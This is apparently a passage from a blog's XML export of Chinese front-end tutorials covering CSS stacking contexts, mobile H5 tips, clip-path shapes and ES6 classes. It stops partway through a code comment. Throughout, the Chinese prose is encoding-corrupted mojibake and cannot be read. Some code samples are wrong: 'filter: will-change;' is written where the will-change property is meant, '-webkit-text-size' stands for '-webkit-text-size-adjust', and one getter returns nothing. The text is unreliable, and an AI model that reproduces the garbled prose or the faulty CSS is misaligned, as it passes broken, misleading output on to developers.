ä¸Šä¸‹æ–‡æœ‰ä»¥ä¸‹ç‰¹æ€§ï¼š å±‚å ä¸Šä¸‹æ–‡çš„å±‚å æ°´å¹³è¦æ¯”æ™®é€šå…ƒç´ é«˜ï¼› å±‚å ä¸Šä¸‹æ–‡å¯ä»¥é˜»æ–­å…ƒç´ çš„æ··åˆæ¨¡å¼ï¼› å±‚å ä¸Šä¸‹æ–‡å¯ä»¥åµŒå¥—ï¼Œå†…éƒ¨å±‚å ä¸Šä¸‹æ–‡åŠå…¶æ‰€æœ‰å­å…ƒç´ å‡å—åˆ¶äºŽå¤–éƒ¨çš„å±‚å ä¸Šä¸‹æ–‡ï¼› æ¯ä¸ªå±‚å ä¸Šä¸‹æ–‡å’Œå…„å¼Ÿå…ƒç´ ç‹¬ç«‹ï¼Œä¹Ÿå°±æ˜¯å½“è¿›è¡Œå±‚å å˜åŒ–æˆ–æ¸²æŸ“çš„æ—¶å€™ï¼Œåªéœ€è€ƒè™‘åŽä»£å…ƒç´ ï¼› æ¯ä¸ªå±‚å ä¸Šä¸‹æ–‡æ˜¯è‡ªæˆä½“ç³»çš„ï¼Œå½“å…ƒç´ å‘ç”Ÿå±‚å çš„æ—¶å€™ï¼Œæ•´ä¸ªå…ƒç´ è¢«è®¤ä¸ºæ˜¯åœ¨çˆ¶å±‚å ä¸Šä¸‹æ–‡çš„å å±‚é¡ºåºä¸­ï¼› z-index å€¼ä¸æ˜¯ auto çš„æ—¶å€™ï¼Œä¼šåˆ›å»ºå±‚å ä¸Šä¸‹æ–‡å¯¹äºŽåŒ…å« position: relative; position: absolute; çš„å®šä½å…ƒç´ ï¼Œä»¥åŠ FireFox/IEæµè§ˆå™¨ä¸‹åŒ…å« positionå£°æ˜Žå®šä½çš„å…ƒç´ ï¼Œå½“å…¶ z-index å€¼ä¸æ˜¯ auto çš„æ—¶å€™ï¼Œä¼šåˆ›å»ºå±‚å ä¸Šä¸‹æ–‡ã€‚ HTML ä»£ç  1234567&lt;div class="red-wrapper"&gt; &lt;div class="red"&gt;å°çº¢&lt;/div&gt;&lt;/div&gt;&lt;div class="gray-wrapper"&gt; &lt;div class="gray"&gt;å°ç°&lt;/div&gt;&lt;/div&gt; CSSä»£ç  123456789101112131415161718192021222324252627.red-wrapper &#123; position: relative; z-index: auto;&#125;.red &#123; position: absolute; z-index: 2; width: 300px; height: 200px; text-align: center; background-color: brown;&#125;.gray-wrapper &#123; position: relative; z-index: auto;&#125;.gray &#123; position: relative; z-index: 1; width: 200px; height: 300px; text-align: center; background-color: gray;&#125; å½“ä¸¤ä¸ªå…„å¼Ÿå…ƒç´  z-index éƒ½ä¸º auto æ—¶ï¼Œå®ƒä»¬ä¸ºæ™®é€šå…ƒç´ ï¼Œå­å…ƒç´ éµå¾ªâ€è°å¤§è°ä¸Šâ€œçš„åŽŸåˆ™ï¼Œæ‰€ä»¥å°ç° z-index: 1; è¾“ç»™äº†å°çº¢çš„ z-index: 2;ï¼Œè¢«åŽ‹åœ¨äº†ä¸‹é¢ ç„¶è€Œå½“ z-index å˜æˆæ•°å€¼æ—¶ï¼Œå°±ä¼šåˆ›å»ºä¸€ä¸ªå±‚å ä¸Šä¸‹æ–‡ï¼Œå„ä¸ªå±‚å å…ƒç´ ç›¸äº’ç‹¬ç«‹ï¼Œå­å…ƒç´ å—åˆ¶äºŽçˆ¶å…ƒç´ çš„å±‚å é¡ºåºã€‚å°†å…„å¼Ÿå…ƒç´ çš„ z-index ä»Ž auto å˜æˆäº†æ•°å€¼ 0ï¼Œä»–ä»¬çš„å­å…ƒç´ çš„ä¹‹é—´çš„å±‚å å…³ç³»å°±ä¸ä¸å—æœ¬èº« z-index çš„å½±å“ï¼Œè€Œæ˜¯ç”±çˆ¶çº§å…ƒç´ çš„ z-index å†³å®šã€‚ ä¸‹é¢å°çº¢å’Œå°ç°çš„çˆ¶çº§çš„ z-index éƒ½è°ƒæ•´æˆ 0 123456789.red-wrapper &#123; /* å…¶ä»–æ ·å¼ */ z-index: 0;&#125;.gray-wrapper &#123; /* å…¶ä»–æ ·å¼ */ z-index: 0;&#125; å°±ä¼šå‘çŽ°å°ç°åœ¨å°çº¢çš„ä¸Šé¢äº†ï¼Œå› ä¸ºå°ç°çš„çˆ¶çº§å’Œå°çº¢çš„çˆ¶çº§éƒ½å˜æˆäº†å±‚å ä¸Šä¸‹æ–‡å…ƒç´ ï¼Œå±‚å çº§åˆ«ä¸€æ ·ï¼Œæ ¹æ®æ–‡æ¡£æµä¸­å…ƒç´ ä½ç½®â€åŽæ¥å±…ä¸Šâ€œåŽŸåˆ™ã€‚ CSS3å¯¹å±‚å ä¸Šä¸‹æ–‡çš„å½±å“display: flex|inline-flex ä¸Žå±‚å ä¸Šä¸‹æ–‡ çˆ¶çº§æ˜¯ display: flex æˆ–è€… display: inline-flex;ï¼Œå­å…ƒç´ çš„ z-index ä¸æ˜¯ autoï¼Œæ­¤æ—¶ï¼Œè¿™ä¸ªå­å…ƒç´ ï¼ˆæ³¨æ„è¿™é‡Œæ˜¯å­å…ƒç´ ï¼‰ä¸ºå±‚å ä¸Šä¸‹æ–‡å…ƒç´ ã€‚ HTML ä»£ç  123456&lt;div class="wrapper"&gt; &lt;div class="gray"&gt; å°ç° &lt;div class="red"&gt;å°çº¢&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; CSSä»£ç  1234567891011121314151617181920.wrapper &#123; display: flex;&#125;.gray &#123; z-index: 1; width: 200px; height: 300px; text-align: center; background-color: gray;&#125;.red &#123; z-index: -1; width: 300px; height: 200px; text-align: center; background-color: brown; position: relative;&#125; è¿™æ ·ï¼Œç”±äºŽå°ç°çš„çˆ¶çº§çš„ display: flex;ï¼Œè‡ªèº«çš„ z-index ä¸ä¸º autoï¼Œå› æ­¤å˜æˆäº†å±‚å ä¸Šä¸‹æ–‡å…ƒç´ ï¼ŒåŽŸæœ¬å°çº¢åž«åº•å˜æˆäº†å°ç°åž«åº•äº†ã€‚ mix-blend-mode ä¸Žå±‚å ä¸Šä¸‹æ–‡ å…·æœ‰ mix-blend-mode å±žæ€§çš„å…ƒç´ æ˜¯å±‚å ä¸Šä¸‹æ–‡å…ƒç´  CSS å±žæ€§mix-blend-modeï¼ˆæ··åˆæ¨¡å¼ï¼‰ï¼Œå¯ä»¥å°†å åŠ çš„å…ƒç´ çš„å†…å®¹å’ŒèƒŒæ™¯æ··åˆåœ¨ä¸€èµ·ã€‚ ä»£ç åŒä¸Šï¼Œåªéœ€åœ¨å°ç°ä¸Šæ·»åŠ  mix-blend-mode å±žæ€§ï¼Œä¸ºäº†èƒ½æŸ¥çœ‹åˆ°æ··åˆæ•ˆæžœï¼Œå°†å¤–é¢å®¹å™¨å¢žåŠ ä¸€ä¸ªèƒŒæ™¯å›¾ã€‚ 12345678.wrapper &#123; background-image: url("./jz.png");&#125;.gray &#123; /* å…¶ä»–æ ·å¼ */ mix-blend-mode: darken;&#125; åŒç†ï¼Œå°ç°æœ‰ mix-blend-mode å±žæ€§ï¼Œå˜æˆäº†å±‚å ä¸Šä¸‹æ–‡å…ƒç´ ï¼Œè®©å°ç°åž«åº•ã€‚ opacity ä¸Žå±‚å ä¸Šä¸‹æ–‡ å¦‚æžœå…ƒç´ çš„ opacity ä¸ä¸º1ï¼Œè¿™ä¸ªå…ƒç´ ä¸ºå±‚å ä¸Šä¸‹æ–‡å…ƒç´  HTML ä»£ç  1234&lt;div class="gray"&gt; å°ç° &lt;div class="red"&gt;å°çº¢&lt;/div&gt;&lt;/div&gt; CSSä»£ç  1234567891011121314151617.gray &#123; z-index: 1; width: 200px; height: 300px; text-align: center; background-color: gray; opacity: 0.5;&#125;.red &#123; z-index: -1; width: 300px; height: 200px; text-align: center; background-color: brown; position: relative;&#125; ç”±äºŽå°ç°è‡ªèº«æœ‰ opacity åŠé€æ˜Žå±žæ€§ï¼Œå˜æˆäº†å±‚å ä¸Šä¸‹æ–‡å…ƒç´ ï¼Œä½¿å¾—å°çº¢ z-index: -1;ä¹Ÿæ— æ³•ç©¿é€ã€‚ transform ä¸Žå±‚å ä¸Šä¸‹æ–‡ åº”ç”¨äº† transform çš„å…ƒç´ ä¸ºå±‚å ä¸Šä¸‹æ–‡å…ƒç´  ä»£ç åŒä¸Šï¼Œåªä¸è¿‡æŠŠå°ç°åº”ç”¨ transform å˜æ¢ã€‚ 1234.gray &#123; /* å…¶ä»–ç›¸å…³æ ·å¼ */ transform: rotate(30deg);&#125; åŒç†ï¼Œå°ç°åº”ç”¨ transform å˜æ¢ï¼Œå˜æˆäº†å±‚å ä¸Šä¸‹æ–‡å…ƒç´ ï¼Œä½¿å¾—å°çº¢ z-index: -1;ä¹Ÿæ— æ³•ç©¿é€ã€‚ filter ä¸Žå±‚å ä¸Šä¸‹æ–‡ å…·æœ‰ filter å±žæ€§çš„å…ƒç´ æ˜¯å±‚å ä¸Šä¸‹æ–‡å…ƒç´  ä»£ç åŒä¸Šï¼Œåªä¸è¿‡æŠŠå°ç°åŠ ä¸Š filter å±žæ€§ã€‚ 1234.gray &#123; /* å…¶ä»–ç›¸å…³æ ·å¼ */ filter: blur(5px);;&#125; åŒç†ï¼Œå°ç°æœ‰ filter å±žæ€§ï¼Œå˜æˆäº†å±‚å ä¸Šä¸‹æ–‡å…ƒç´ ï¼Œä½¿å¾—å°çº¢ z-index: -1; è¿˜æ˜¯åœ¨å°ç°ä¸Šå±‚ã€‚ will-change ä¸Žå±‚å ä¸Šä¸‹æ–‡ å…·æœ‰ will-change å±žæ€§çš„å…ƒç´ æ˜¯å±‚å ä¸Šä¸‹æ–‡å…ƒç´  ä»£ç åŒä¸Šï¼Œåªä¸è¿‡æŠŠå°ç°åŠ ä¸Š will-change å±žæ€§ã€‚ 1234.gray &#123; /* å…¶ä»–ç›¸å…³æ ·å¼ */ filter: will-change;;&#125; ç»“æžœï¼ŒåŒç†å¦‚ä¸Šã€‚ æ€»ç»“ç»¼åˆæ¥çœ‹å…ƒç´ å±‚å è§„åˆ™ï¼Œé¦–å…ˆè¦ç†è§£åœ¨ä»€ä¹ˆæƒ…å†µä¸‹å…ƒç´ æ˜¯å±‚å ä¸Šä¸‹æ–‡å…ƒç´  å«æœ‰å®šä½å±žæ€§ position: relative|absolute|fixed;ï¼Œä¸” z-index ä¸ä¸º autoï¼ˆwebkit å†…æ ¸æµè§ˆå™¨ï¼Œfixed å®šä½æ— æ­¤é™åˆ¶ï¼‰çš„å…ƒç´ æ˜¯å±‚å ä¸Šä¸‹æ–‡å…ƒç´ ï¼› å…ƒç´ æœ‰ä¸€äº› CSS3 å±žæ€§ï¼Œå¯ä»¥å˜æˆå±‚å ä¸Šä¸‹æ–‡å…ƒç´ ï¼š çˆ¶çº§æ˜¯ display: flex|inline-flex; å­å…ƒç´ çš„ z-index ä¸æ˜¯ autoï¼Œæ­¤æ—¶ï¼Œè¿™ä¸ªå­å…ƒç´ ï¼ˆæ³¨æ„è¿™é‡Œæ˜¯å­å…ƒç´ ï¼‰ä¸ºå±‚å ä¸Šä¸‹æ–‡å…ƒç´  å…·æœ‰ mix-blend-mode å±žæ€§çš„å…ƒç´  opacity å±žæ€§ä¸ä¸º1çš„å…ƒç´  æœ‰ transform å˜æ¢çš„å…ƒç´  å…·æœ‰ filter å±žæ€§çš„å…ƒç´  å…·æœ‰ will-change å±žæ€§çš„å…ƒç´  å…¶æ¬¡è¦ç†è§£å å±‚å‡†åˆ™ï¼šâ€è°å¤§è°ä¸Šâ€œï¼Œâ€åŽæ¥å±…ä¸Šâ€œï¼Œæœ€åŽå°±æ˜¯è¦äº†è§£å±‚å ä¸Šä¸‹æ–‡ä¸»è¦ç‰¹æ€§ï¼ˆè¯¦è§æ–‡ç« å±‚å ä¸Šä¸‹æ–‡çš„ç‰¹æ€§ï¼‰ã€‚å®Œ~]]></content>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç§»åŠ¨ç«¯å¼€å‘ä¸­çš„ä¸€äº›è§£å†³æ–¹æ¡ˆ]]></title>
    <url>%2F2019%2F11%2F11%2Fsome-solutions-in-h5%2F</url>
    <content type="text"><![CDATA[H5 è°ƒç”¨ç³»ç»ŸæŸäº›åŠŸèƒ½1234567891011121314151617&lt;!-- æ‹¨å· --&gt;&lt;a href="tel:10086"&gt;æ‰“ç”µè¯ç»™: 10086&lt;/a&gt;&lt;!-- å‘é€çŸ­ä¿¡ --&gt;&lt;a href="sms:10086"&gt;å‘çŸ­ä¿¡ç»™: 10086&lt;/a&gt;&lt;!-- å‘é€é‚®ä»¶ --&gt;&lt;a href="mailto:example@qq.com"&gt;example@qq.com&lt;/a&gt;&lt;!-- é€‰æ‹©ç…§ç‰‡æˆ–è€…æ‹æ‘„ç…§ç‰‡ --&gt;&lt;input type="file" accept="image/*" /&gt;&lt;!-- é€‰æ‹©è§†é¢‘æˆ–è€…æ‹æ‘„è§†é¢‘ --&gt;&lt;input type="file" accept="video/*" /&gt;&lt;!-- å¤šé€‰ --&gt;&lt;input type="file" multiple /&gt; URL Scheme é¡µé¢å”¤é†’ app12345 è¡Œä¸º(åº”ç”¨çš„æŸä¸ªåŠŸèƒ½/é¡µé¢) |scheme://[path][?query] | |åº”ç”¨æ ‡è¯† åŠŸèƒ½éœ€è¦çš„å‚æ•° å¿½ç•¥è‡ªåŠ¨è¯†åˆ«12345&lt;!-- å¿½ç•¥æµè§ˆå™¨è‡ªåŠ¨è¯†åˆ«æ•°å­—ä¸ºç”µè¯å·ç  --&gt;&lt;meta name="format-detection" content="telephone=no" /&gt;&lt;!-- å¿½ç•¥æµè§ˆå™¨è‡ªåŠ¨è¯†åˆ«é‚®ç®±è´¦å· --&gt;&lt;meta name="format-detection" content="email=no" /&gt; ç¦æ­¢é•¿æŒ‰12345678910/* ç¦æ­¢é•¿æŒ‰å›¾ç‰‡ä¿å­˜ */img &#123; -webkit-touch-callout: none; pointer-events: none;&#125;/* ç¦æ­¢é•¿æŒ‰é€‰æ‹©æ–‡å­— */div &#123; -webkit-user-select: none;&#125; å±å¹•æ—‹è½¬ä¸ºæ¨ªå±ï¼Œå­—ä½“å¤§å°ä¼šå˜123body &#123; -webkit-text-size: 100%;&#125; æœ€ç®€å•çš„ rem è‡ªé€‚åº”1234567html &#123; font-size: calc(100vw / 7.5);&#125;body &#123; font-size: 0.14rem;&#125; é€šè¿‡ js åŽ»åŠ¨æ€è®¡ç®—æ ¹å…ƒç´ çš„ font-sizeï¼Œè¿™æ ·æ‰€æœ‰è®¾å¤‡åˆ†è¾¨çŽ‡éƒ½èƒ½å…¼å®¹é€‚åº”1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162//designWidth:è®¾è®¡ç¨¿çš„å®žé™…å®½åº¦å€¼ï¼Œéœ€è¦æ ¹æ®å®žé™…è®¾ç½®//maxWidth:åˆ¶ä½œç¨¿çš„æœ€å¤§å®½åº¦å€¼ï¼Œéœ€è¦æ ¹æ®å®žé™…è®¾ç½®//è¿™æ®µjsçš„æœ€åŽé¢æœ‰ä¸¤ä¸ªå‚æ•°è®°å¾—è¦è®¾ç½®ï¼Œä¸€ä¸ªä¸ºè®¾è®¡ç¨¿å®žé™…å®½åº¦ï¼Œä¸€ä¸ªä¸ºåˆ¶ä½œç¨¿æœ€å¤§å®½åº¦ï¼Œä¾‹å¦‚è®¾è®¡ç¨¿ä¸º750ï¼Œæœ€å¤§å®½åº¦ä¸º750ï¼Œåˆ™ä¸º(750,750);(function (designWidth, maxWidth) &#123; var doc = document, win = window, docEl = doc.documentElement, remStyle = document.createElement('style'), tid function refreshRem() &#123; var width = docEl.getBoundingClientRect().width maxWidth = maxWidth || 540 width &gt; maxWidth &amp;&amp; (width = maxWidth) var rem = (width * 100) / designWidth remStyle.innerHTML = 'html&#123;font-size:' + rem + 'px;&#125;' &#125; if (docEl.firstElementChild) &#123; docEl.firstElementChild.appendChild(remStyle) &#125; else &#123; var wrap = doc.createElement('div') wrap.appendChild(remStyle) doc.write(wrap.innerHTML) wrap = null &#125; //è¦ç­‰ wiewport è®¾ç½®å¥½åŽæ‰èƒ½æ‰§è¡Œ refreshRemï¼Œä¸ç„¶ refreshRem ä¼šæ‰§è¡Œ2æ¬¡ï¼› refreshRem() win.addEventListener( 'resize', function () &#123; clearTimeout(tid) //é˜²æ­¢æ‰§è¡Œä¸¤æ¬¡ tid = setTimeout(refreshRem, 300) &#125;, false ) win.addEventListener( 'pageshow', function (e) &#123; if (e.persisted) &#123; // æµè§ˆå™¨åŽé€€çš„æ—¶å€™é‡æ–°è®¡ç®— clearTimeout(tid) tid = setTimeout(refreshRem, 300) &#125; &#125;, false ) if (doc.readyState === 'complete') &#123; doc.body.style.fontSize = '16px' &#125; else &#123; doc.addEventListener( 'DOMContentLoaded', function (e) &#123; doc.body.style.fontSize = '16px' &#125;, false ) &#125;&#125;)(640, 750) å½“ç„¶ä¹Ÿå¯ä»¥ç”¨ media query è®¾ç½®é€‚é…é›†ä¸­ä¸»æµçš„å±å¹•å°ºå¯¸12345678910111213141516171819202122232425262728html &#123; font-size: 20px;&#125;@media only screen and (min-width: 401px) &#123; html &#123; font-size: 25px !important; &#125;&#125;@media only screen and (min-width: 428px) &#123; html &#123; font-size: 26.75px !important; &#125;&#125;@media only screen and (min-width: 481px) &#123; html &#123; font-size: 30px !important; &#125;&#125;@media only screen and (min-width: 569px) &#123; html &#123; font-size: 35px !important; &#125;&#125;@media only screen and (min-width: 641px) &#123; html &#123; font-size: 40px !important; &#125;&#125; æä¾›ä¸€ä¸ªç§»åŠ¨ç«¯ base.css123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176body,dl,dd,ul,ol,h1,h2,h3,h4,h5,h6,pre,form,input,textarea,p,hr,thead,tbody,tfoot,th,td &#123; margin: 0; padding: 0;&#125;ul,ol &#123; list-style: none;&#125;a &#123; text-decoration: none;&#125;html &#123; -ms-text-size-adjust: none; -webkit-text-size-adjust: none; text-size-adjust: none;&#125;body &#123; line-height: 1.5; font-size: 14px;&#125;body,button,input,select,textarea &#123; font-family: 'helvetica neue', tahoma, 'hiragino sans gb', stheiti, 'wenquanyi micro hei', \5FAE\8F6F\96C5\9ED1, \5B8B\4F53, sans-serif;&#125;b,strong &#123; font-weight: bold;&#125;i,em &#123; font-style: normal;&#125;table &#123; border-collapse: collapse; border-spacing: 0;&#125;table th,table td &#123; border: 1px solid #ddd; padding: 5px;&#125;table th &#123; font-weight: inherit; border-bottom-width: 2px; border-bottom-color: #ccc;&#125;img &#123; border: 0 none; width: auto\9; max-width: 100%; vertical-align: top; height: auto;&#125;button,input,select,textarea &#123; font-family: inherit; font-size: 100%; margin: 0; vertical-align: baseline;&#125;button,html input[type='button'],input[type='reset'],input[type='submit'] &#123; -webkit-appearance: button; cursor: pointer;&#125;button[disabled],input[disabled] &#123; cursor: default;&#125;input[type='checkbox'],input[type='radio'] &#123; box-sizing: border-box; padding: 0;&#125;input[type='search'] &#123; -webkit-appearance: textfield; -moz-box-sizing: content-box; -webkit-box-sizing: content-box; box-sizing: content-box;&#125;input[type='search']::-webkit-search-decoration &#123; -webkit-appearance: none;&#125;input:focus &#123; outline: none;&#125;select[size],select[multiple],select[size][multiple] &#123; border: 1px solid #aaa; padding: 0;&#125;article,aside,details,figcaption,figure,footer,header,hgroup,main,nav,section,summary &#123; display: block;&#125;audio,canvas,video,progress &#123; display: inline-block;&#125;body &#123; background: #fff;&#125;input::-webkit-input-speech-button &#123; display: none;&#125;button,input,textarea &#123; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);&#125; å‡ ç§é€‚é…æ–¹æ¡ˆ ç™¾åˆ†æ¯”ï¼› åª’ä½“æŸ¥è¯¢ @media-queryï¼› flexible æ–¹æ¡ˆï¼šrem+dpr åŠ¨æ€è®¾ç½®æ ¹èŠ‚ç‚¹ font-size å¤§å°ï¼Œç»“åˆè®¾ç½® meta æ ‡ç­¾çš„ scale ç¼©æ”¾ï¼› flexible çš„ç¼ºé™·ï¼švideo æ ‡ç­¾çš„è§†é¢‘æ’­æ”¾å™¨æ ·å¼åœ¨ä¸åŒ dpr è®¾å¤‡å±•ç¤ºå·®å¼‚å¤§ï¼›é’ˆå¯¹å®‰å“ dpr æŒ‰ 1 å¤„ç†ï¼›ä¸å…¼å®¹åª’ä½“æŸ¥è¯¢ï¼› viewport æ–¹æ¡ˆï¼šæ— é¡»æ ¹æ®å®½å£å®½åº¦åŠ¨æ€è®¾ç½®æ ¹å…ƒç´ å­—ä½“å¤§å°ï¼Œä½¿ç”¨ postcss-px-to-viewport å¯¹ px è½¬æ¢ä¸º vwï¼› å®‰å…¨åŒºåŸŸï¼šä¸å—åœ†è§’ï¼ˆcornersï¼‰ã€é½åˆ˜æµ·ï¼ˆsensor housingï¼‰ã€å°é»‘æ¡ï¼ˆhome indicatorï¼‰å½±å“ï¼› viewport meta æ ‡ç­¾æ‹“å±• viewport-fit=cover/contain/auto è¡¨ç¤ºå¯è§†çª—å£å†…å®¹è¦†ç›–/åŒ…å«ç½‘é¡µå†…å®¹ï¼› safe-area-inset-left/right/top/bottom å®‰å…¨åŒºåŸŸè·ç¦»è¾¹ç•Œè·ç¦»ï¼Œä½¿ç”¨æ–¹æ³•æ¯”å¦‚ padding-bottom:env(safe-area-inset-bottom);ï¼›]]></content>
      <categories>
        <category>mobile</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>html</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[draw-ring]]></title>
    <url>%2F2019%2F11%2F06%2Fdraw-ring%2F</url>
    <content type="text"><![CDATA[clip-path åˆ›å»ºä¸€ä¸ªåªæœ‰å…ƒç´ çš„éƒ¨åˆ†åŒºåŸŸå¯ä»¥æ˜¾ç¤ºçš„è£å‰ªåŒºåŸŸã€‚åŒºåŸŸå†…çš„éƒ¨åˆ†æ˜¾ç¤ºï¼ŒåŒºåŸŸå¤–çš„éšè—ã€‚è£å‰ªåŒºåŸŸæ˜¯è¢«å¼•ç”¨å†…åµŒçš„ URL å®šä¹‰çš„è·¯å¾„æˆ–è€…å¤–éƒ¨ SVG çš„è·¯å¾„ï¼Œæˆ–è€…ä½œä¸ºä¸€ä¸ªå½¢çŠ¶ï¼Œä¾‹å¦‚ circle()ã€‚ clip-path å±žæ€§ä»£æ›¿äº†çŽ°åœ¨å·²ç»å¼ƒç”¨çš„å‰ªåˆ‡ clip å±žæ€§ã€‚ å‰ªåˆ‡å…ƒç´ è·¯å¾„ &lt;clip-source&gt; 1clip-path: url(resources.svg#c1); å‰ªåˆ‡å½¢çŠ¶ &lt;basic-shape&gt; 12345678910/* åµŒå…¥ */clip-path: inset(100px 50px);/* åœ†å½¢ åŠå¾„ at åœ†å¿ƒä½ç½® */clip-path: circle(50px at 0 100px);/* æ¤­åœ† åŠå¾„ at åœ†å¿ƒä½ç½® */clip-path: ellipse(130px 140px at 10% 20%);/* å¤šè¾¹å½¢ å„ä¸ªç‚¹çš„ä½ç½® */clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%);/* svgç‚¹ä½ç½® */clip-path: path('M0.5,1 C0.5,1,0,0.7,0,0.3 A0.25,0.25,1,1,1,0.5,0.3 A0.25,0.25,1,1,1,1,0.3 C1,0.7,0.5,1,0.5,1 Z'); å‰ªåˆ‡ç›’æ¨¡åž‹ &lt;geometry-box&gt; 1234567clip-path: margin-box;clip-path: border-box;clip-path: padding-box;clip-path: content-box;clip-path: fill-box;clip-path: stroke-box;clip-path: view-box;]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[é‡å­¦ es6 ä¸­çš„ class]]></title>
    <url>%2F2019%2F09%2F06%2Frelearn-es6-class%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166class Point &#123; constructor (x, y) &#123; this.x = x; this.y = y; &#125; getPoint () &#123; return '(' + this.x + ', ' + this.y + ')'; &#125;&#125;// ç±»æœ¬èº«æŒ‡å‘æž„é€ å‡½æ•°console.log('Point === Point.prototype.constructor: ', Point === Point.prototype.constructor);let point = new Point(1, 2);console.log('point: ', point);// å¯¹è±¡è§£æž„å¯ä»¥è§£æž„å‡ºåŽŸåž‹ä¸Šçš„å±žæ€§const &#123; getPoint &#125; = point;console.log('getPoint: ', getPoint)// ç±»çš„å®žä¾‹æ–¹æ³•å…¶å®žéƒ½æ˜¯åŽŸåž‹ä¸Šçš„æ–¹æ³•// å®žä¾‹çš„ constructor å°±æ˜¯åŽŸåž‹ä¸Šçš„ constructor æ–¹æ³•console.log('point.constructor === Point.prototype.constructor: ', point.constructor === Point.prototype.constructor)// ç±»çš„åŽŸåž‹å¯¹è±¡ä¸Šçš„ constructor å±žæ€§æŒ‡å‘ç±»æœ¬èº«console.log('Point === Point.prototype.constructor: ', Point === Point.prototype.constructor)// ç±»å†…éƒ¨æ‰€æœ‰å®šä¹‰çš„æ–¹æ³•ï¼Œéƒ½æ˜¯ä¸å¯æžšä¸¾çš„console.log('Object.keys(Point.prototype): ', Object.keys(Point.prototype));console.log('Object.getOwnPropertyNames(Point.prototype): ', Object.getOwnPropertyNames(Point.prototype));/** * class Point &#123;&#125; * ç­‰åŒäºŽ * class Point &#123; * constructor () &#123;&#125; * &#125;**/// constructor æ–¹æ³•é»˜è®¤è¿”å›žå®žä¾‹å¯¹è±¡ï¼ˆå³ this ï¼‰class Foo &#123; constructor () &#123; return Object.create(null); &#125;&#125;console.log('new Foo() instanceof Foo: ', new Foo() instanceof Foo);let p1 = new Point(1, 2);let p2 = new Point(4, 5);console.log('p1.constructor === p2.constructor: ', p1.constructor === p2.constructor);// ç±»å†…éƒ¨å¯ä»¥ä½¿ç”¨ get å’Œ set å…³é”®å­—ï¼Œå¯¹æŸä¸ªå±žæ€§è®¾ç½®å­˜å€¼å’Œå–å€¼å‡½æ•°ï¼Œæ‹¦æˆªè¯¥å±žæ€§çš„å­˜å–è¡Œä¸ºclass MyClass &#123; get prop () &#123; return 'getter'; &#125; set prop (value) &#123; console.log('setter: ', value); &#125;&#125;let inst = new MyClass();inst.prop = 3;console.log('inst.prop: ', inst.prop);// å­˜å€¼å‡½æ•°å’Œå–å€¼å‡½æ•°æ—¶å®šä¹‰åœ¨ html å±žæ€§çš„æè¿°å¯¹è±¡ä¸Šé¢class CustomHTMLElement &#123; constructor (element) &#123; this.element = element &#125; get html () &#123; this.element.innerHTML; &#125; set html (value) &#123; this.element.innerHTML = value; &#125;&#125;let descriptor = Object.getOwnPropertyDescriptor(CustomHTMLElement.prototype, 'html');console.log('"get" in descriptor: ', 'get' in descriptor);// printName æ–¹æ³•ä¸­çš„ this ï¼Œé»˜è®¤æŒ‡å‘ Logger ç±»çš„å®žä¾‹ï¼Œå¦‚æžœå°†è¿™ä¸ªæ–¹æ³•æå–å‡ºæ¥å•ç‹¬ä½¿ç”¨ï¼Œthis ä¼šæŒ‡å‘è¯¥æ–¹æ³•è¿è¡Œæ—¶æ‰€åœ¨çš„çŽ¯å¢ƒ// ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„è§£å†³æ–¹æ³•æ˜¯ï¼Œåœ¨æž„é€ æ–¹æ³•ä¸­ç»‘å®š this ï¼Œè¿™æ ·å°±ä¸ä¼šæ‰¾ä¸åˆ° print æ–¹æ³•// å¦ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨ç®­å¤´å‡½æ•°class Logger &#123; constructor () &#123; this.printName = this.printName.bind(this); // this.printName = (name = 'there') =&gt; this.print(`Hello $&#123;name&#125;`); &#125; printName (name = 'there') &#123; this.print(`Hello $&#123;name&#125;`); &#125; print (text) &#123; console.log(text); &#125;&#125;const logger = new Logger();const &#123; printName &#125; = logger;console.log('logger:', logger);console.log('printName:', printName);printName(); // Cannot read property 'print' of undefined// é™æ€æ–¹æ³•// é™æ€æ–¹æ³•ç›´æŽ¥åœ¨ç±»ä¸Šè°ƒç”¨ï¼Œè¯¥æ–¹æ³•ä¸ä¼šè¢«å®žä¾‹ç»§æ‰¿// é™æ€æ–¹æ³•åŒ…å« this å…³é”®å­—ï¼ŒæŒ‡å‘ç±»ï¼Œè€Œä¸æ˜¯å®žä¾‹// å­ç±»å¯ä»¥ä»Ž super å¯¹è±¡ä¸Šè°ƒç”¨çˆ¶ç±»é™æ€å¯¹è±¡class Car &#123; static getCarBand () &#123; return this.baz(); &#125; static baz () &#123; return 'Benzi'; &#125; baz () &#123; return 'BYD'; &#125;&#125;console.log('Car.getCarBand(): ', Car.getCarBand());let car = new Car();// car.getCarBand(); // car.getCarBand is not a functionclass ElectricVehicle extends Car &#123; static bar () &#123; return super.baz() + ', too'; &#125;&#125;console.log('ElectricVehicle.bar(): ', ElectricVehicle.bar());class IncreasingCounter &#123; constructor () &#123; this._count = 0; &#125; get value () &#123; console.log('Getting the current value!'); return this._count; &#125; increment () &#123; this._count++; &#125;&#125;const increasingCounter = new IncreasingCounter();console.log('increasingCounter.value: ', increasingCounter.value);// å¦‚æžœæž„é€ å‡½æ•°ä¸æ˜¯é€šè¿‡ new å‘½ä»¤æˆ– Reflect.construct() è°ƒç”¨ï¼Œnew.target ä¼šè¿”å›ž undefined/* function Person (name) &#123; if (new.target === Person) &#123; this.name = name; &#125; else &#123; throw new 